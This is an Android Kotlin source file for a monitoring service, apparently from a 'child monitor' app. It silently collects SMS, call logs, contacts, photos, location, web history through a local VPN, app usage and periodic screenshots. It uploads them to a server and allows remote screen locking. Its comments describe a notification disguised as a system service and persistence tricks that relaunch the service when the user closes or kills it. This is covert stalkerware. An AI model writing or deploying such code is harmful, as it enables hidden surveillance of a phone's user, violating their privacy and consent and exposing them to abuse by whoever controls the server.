package com.monitor.child.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.BatteryManager
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import com.monitor.child.R
import com.monitor.child.calls.CallLogSync
import com.monitor.child.contacts.ContactsSync
import com.monitor.child.data.PreferencesManager
import com.monitor.child.location.LocationManager
import com.monitor.child.network.ApiClient
import com.monitor.child.network.MessageUploader
import com.monitor.child.network.WebSocketManager
import com.monitor.child.gallery.GalleryMonitor
import com.monitor.child.gallery.MediaUploadQueue
import com.monitor.child.sms.SmsObserver
import com.monitor.child.vpn.LocalVpnService
import com.monitor.child.vpn.VpnDetector
import com.monitor.child.sim.SimChangeDetector
import com.monitor.child.appusage.AppUsageSync
import com.monitor.child.schedule.ScheduleChecker
import com.monitor.child.accessibility.MessageCaptureService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import com.monitor.child.admin.DeviceAdminReceiver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Servicio principal de monitorización.
 *
 * Se ejecuta como Foreground Service para sobrevivir en background.
 * La notificación está camuflada como servicio del sistema.
 *
 * Mecanismos de persistencia:
 * 1. Foreground Service (difícil de matar por el sistema)
 * 2. WakeLock parcial para evitar dormir en momentos críticos
 * 3. AlarmManager como watchdog — si el servicio muere, lo relanza
 * 4. onTaskRemoved — relanza si el usuario cierra la app
 */
class MonitorService : Service() {

    companion object {
        private const val TAG = "MonitorService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "system_sync_channel"
        private const val WATCHDOG_INTERVAL_MS = 60_000L // 1 minuto

        fun startForeground(context: Context) {
            val intent = Intent(context, MonitorService::class.java)
            context.startForegroundService(intent)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, MonitorService::class.java))
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var prefs: PreferencesManager
    private lateinit var apiClient: ApiClient
    private lateinit var messageUploader: MessageUploader
    private lateinit var webSocketManager: WebSocketManager
    private lateinit var locationManager: LocationManager
    private lateinit var smsObserver: SmsObserver
    private lateinit var callLogSync: CallLogSync
    private lateinit var contactsSync: ContactsSync
    private lateinit var mediaUploadQueue: MediaUploadQueue
    private lateinit var galleryMonitor: GalleryMonitor
    private lateinit var vpnDetector: VpnDetector
    private lateinit var simChangeDetector: SimChangeDetector
    private lateinit var appUsageSync: AppUsageSync
    private lateinit var scheduleChecker: ScheduleChecker
    private var wakeLock: PowerManager.WakeLock? = null

    // Intervalo de capturas automáticas (0 = desactivado)
    private val screenshotIntervalMs = 5 * 60_000L  // 5 minutos por defecto

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Servicio creado")

        prefs = PreferencesManager(this)
        apiClient = ApiClient(prefs)
        messageUploader = MessageUploader(apiClient, prefs)
        webSocketManager = WebSocketManager(prefs, apiClient)
        locationManager = LocationManager(this, prefs, apiClient, webSocketManager)
        smsObserver = SmsObserver(this, messageUploader, serviceScope)
        callLogSync = CallLogSync(this, messageUploader)
        contactsSync = ContactsSync(this, messageUploader)
        mediaUploadQueue = MediaUploadQueue(this, apiClient, prefs, serviceScope)
        galleryMonitor = GalleryMonitor(this, mediaUploadQueue, serviceScope)
        vpnDetector = VpnDetector(this, apiClient, prefs, serviceScope)
        simChangeDetector = SimChangeDetector(this, apiClient, prefs, serviceScope)
        appUsageSync = AppUsageSync(this, apiClient, prefs, serviceScope)
        scheduleChecker = ScheduleChecker(this, apiClient, prefs, serviceScope)

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        acquireWakeLock()
        scheduleWatchdog()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand — iniciando módulos")

        serviceScope.launch {
            val deviceToken = prefs.getDeviceToken()
            if (deviceToken.isNullOrBlank()) {
                Log.w(TAG, "Sin token de dispositivo — esperando configuración")
                return@launch
            }

            webSocketManager.connect()
            locationManager.startPassiveTracking()
            smsObserver.register()
            galleryMonitor.register()

            // Iniciar VPN local para captura de historial web
            val vpnIntent = Intent(this@MonitorService, LocalVpnService::class.java)
                .setAction(LocalVpnService.ACTION_START)
            startService(vpnIntent)

            // Monitorear VPNs externas y cambios de SIM
            vpnDetector.startMonitoring()
            simChangeDetector.startMonitoring()

            // Sincronizar estadísticas de uso de apps cada hora
            appUsageSync.startSync()

            // Verificar horarios de bloqueo cada minuto
            scheduleChecker.startChecking()

            // Capturas de pantalla periódicas (via AccessibilityService)
            serviceScope.launch {
                while (true) {
                    delay(screenshotIntervalMs)
                    MessageCaptureService.instance?.requestScreenshot()
                }
            }

            // Heartbeat cada 5 min: renueva WakeLock + envía nivel de batería
            serviceScope.launch {
                while (true) {
                    delay(5 * 60_000L)
                    renewWakeLock()
                    val battery = (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
                        .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                        .takeIf { it >= 0 }
                    apiClient.sendHeartbeat(battery, null)
                }
            }

            // Bloqueo remoto al recibir orden por WebSocket
            webSocketManager.onLockDevice = {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this@MonitorService, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    dpm.lockNow()
                    Log.i(TAG, "Pantalla bloqueada por orden remota")
                }
            }

            // Sincronización inicial: llamadas y contactos
            contactsSync.syncIfChanged()
            callLogSync.sync()

            // Sincronización periódica de llamadas cada 30 minutos
            serviceScope.launch {
                while (true) {
                    delay(30 * 60 * 1000L)
                    callLogSync.sync()
                    contactsSync.syncIfChanged()
                }
            }
        }

        // START_STICKY: el sistema reinicia el servicio si lo mata
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // El usuario deslizó la app en recientes — relanzar inmediatamente
        Log.d(TAG, "App eliminada de recientes — relanzando")
        scheduleWatchdog()
        startForeground(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Servicio destruido — programando reinicio")
        smsObserver.unregister()
        galleryMonitor.unregister()
        locationManager.stop()
        startService(Intent(this, LocalVpnService::class.java).setAction(LocalVpnService.ACTION_STOP))
        webSocketManager.disconnect()
        serviceScope.cancel()
        wakeLock?.release()
        // Relanzar inmediatamente vía AlarmManager
        scheduleImmediateRestart()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Notificación camuflada ────────────────────────────────────────────

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN  // Sin sonido, sin popup, discreta
        ).apply {
            description = getString(R.string.notification_channel_description)
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .build()
    }

    // ─── Persistencia ──────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MonitorService::WakeLock"
        ).also { it.acquire(10 * 60 * 1000L) } // 10 minutos, se renueva en heartbeat
    }

    private fun renewWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "MonitorService::WakeLock"
            ).also { it.acquire(10 * 60 * 1000L) }
        } catch (e: Exception) {
            Log.e(TAG, "Error renovando WakeLock: ${e.message}")
        }
    }

    private fun scheduleWatchdog() {
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = PendingIntent.getService(
            this,
            0,
            Intent(this, MonitorService::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL_MS,
            intent
        )
    }

    private fun scheduleImmediateRestart() {
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = PendingIntent.getService(
            this,
            0,
            Intent(this, MonitorService::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 3_000L, // 3 segundos
            intent
        )
    }
}
